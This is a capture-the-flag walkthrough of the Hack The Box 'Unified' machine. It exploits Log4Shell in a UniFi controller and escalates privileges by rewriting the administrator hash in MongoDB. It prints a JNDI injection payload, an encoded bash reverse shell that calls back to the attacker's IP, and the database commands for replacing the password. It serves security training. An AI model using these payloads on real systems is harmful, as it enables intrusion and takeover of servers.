---
title: HTB Unified — Log4Shell to MongoDB Privilege Escalation
description: A complete walkthrough of exploiting a vulnerable UniFi controller using CVE-2021-44228 (Log4Shell), followed by privilege escalation through MongoDB.
tags: [HTB, Log4Shell, CVE-2021-44228, Privilege Escalation, MongoDB, Burp Suite, RogueJNDI, Penetration Testing]
date: 2025-07-15
author: zerokoollabs
---

# HTB Unified — Log4Shell to MongoDB Privilege Escalation

**Target IP**: `10.129.96.149`  
**Attack IP**: `10.10.14.70`  
**Reverse Shell Port**: `4444`

---

## 📑 Table of Contents

- [🕵️ Enumeration](#-enumeration)
- [💣 Log4Shell Exploit Validation](#-log4shell-exploit-validation)
- [🔎 Understanding the Exploit](#-understanding-the-exploit)
- [🧰 Tools Required](#-tools-required)
- [⚙️ Exploiting Log4Shell](#️-exploiting-log4shell)
- [🧑‍💻 Foothold: User Flag](#-foothold-user-flag)
- [📈 Privilege Escalation via MongoDB](#-privilege-escalation-via-mongodb)
- [🔁 Password Replacement](#-password-replacement)
- [🔐 Root Flag](#-root-flag)
- [🧠 Lessons Learned](#-lessons-learned)

---

## 🕵️ Enumeration

```bash
nmap -sC -sV -v 10.129.96.149
```

Open ports:
- `22` (SSH)
- `6789`
- `8080` – redirects to port `8443`
- `8443` – SSL, title: **UniFi Network**, version 6.4.54  
  **CVE-2021-44228 (Log4Shell)** confirmed vulnerable

Web interface:  
[https://10.129.96.149:8443](https://10.129.96.149:8443)

---

## 💣 Log4Shell Exploit Validation

Injected payload into login request via Burp Repeater:

```text
"${jndi:ldap://10.10.14.70:1389/garbageresource}"
```

Response:
- `HTTP 400 Bad Request`
- Body: `api.err.InvalidPayload`

Despite the error, the Log4j engine **processed the payload**.  
To confirm this:

```bash
sudo tcpdump -i tun0 port 389
# or use Wireshark
```

Both tools confirmed outbound LDAP traffic — a classic indicator of Log4Shell triggering remote lookups.

---

## 🔎 Understanding the Exploit

- `${...}` → Log4j expression syntax
- `jndi:ldap://...` → triggers remote class loading
- Log4j (pre-2.15.0) + JNDI + LDAP = 🚨 Remote Code Execution

**JNDI**: Java Naming and Directory Interface  
**LDAP**: Lightweight Directory Access Protocol  

---

## 🧰 Tools Required

```bash
sudo apt install openjdk-17-jdk maven
git clone https://github.com/veracode-research/rogue-jndi
cd rogue-jndi && mvn package
```

---

## ⚙️ Exploiting Log4Shell

1. Base64-encode reverse shell:
   ```bash
   echo 'bash -c "bash -i >& /dev/tcp/10.10.14.70/4444 0>&1"' | base64
   ```

2. Launch RogueJNDI server:
   ```bash
   java -jar target/RogueJndi-1.1.jar      --command "bash -c {echo,YmFzaCAtYyBiYXNoIC1pID4mL2Rldi90Y3AvMTAuMTAuMTQuNzAvNDQ0NCAwPiYxCg==} | {base64,-d} | {bash,-i}"      --hostname "10.10.14.70"
   ```

3. Start netcat listener:
   ```bash
   nc -lvnp 4444
   ```

4. Final payload into login request:
   ```text
   "${jndi:ldap://10.10.14.70:1389/o=tomcat}"
   ```

5. Shell upgraded with:
   ```bash
   script /dev/null -c bash
   ```

---

## 🧑‍💻 Foothold: User Flag

User flag found at:

```bash
/home/michael/user.txt
6ced1a6a89e666c0620cdb10262ba127
```

---

## 📈 Privilege Escalation via MongoDB

Mongo was running locally:

```bash
ps aux | grep mongo
```

Enumerated the `ace` database:

```bash
mongo --port 27117 ace --eval 'db.admin.find().forEach(printjson);'
```

Found administrator hash under `x_shadow`.

---

## 🔁 Password Replacement

Generated SHA-512 hash using salt:

```bash
mkpasswd -m sha-512 -S Ry6Vdbse Password1234
```

Updated password directly in Mongo:

```bash
mongo --port 27117 ace --eval '
db.admin.update(
  { "_id": ObjectId("61ce278f46e0fb0012d47ee4") },
  { $set: { "x_shadow": "$6$Ry6Vdbse$.iOgzx5bue2lXcKEbZw6axl3NZIazyfC4wOtNNXuxzX2.XEiDeJpNoDW4DOnyztRlXjVQY5mTKAVIRVmYfWin1" } }
)'
```

Logged into the UniFi web panel as:

```
Username: administrator
Password: Password1234
```

Discovered plaintext root credentials:
```
NotACrackablePassword4U2022
```

---

## 🔐 Root Flag

SSH'd into target and retrieved:

```bash
cat /root/root.txt
e50bc93c75b634e4b272d2f771c33681
```

---

## 🧠 Lessons Learned

- Log4Shell’s danger lies in its abuse of a logging framework to perform dynamic remote code loading.
- Burp Suite, tcpdump, and Wireshark are essential tools to validate dangerous behavior.
- MongoDB without auth controls + local access = privilege escalation path.
- Always sanitize input reaching APIs and logging systems.

---

### ✅ Pwned.
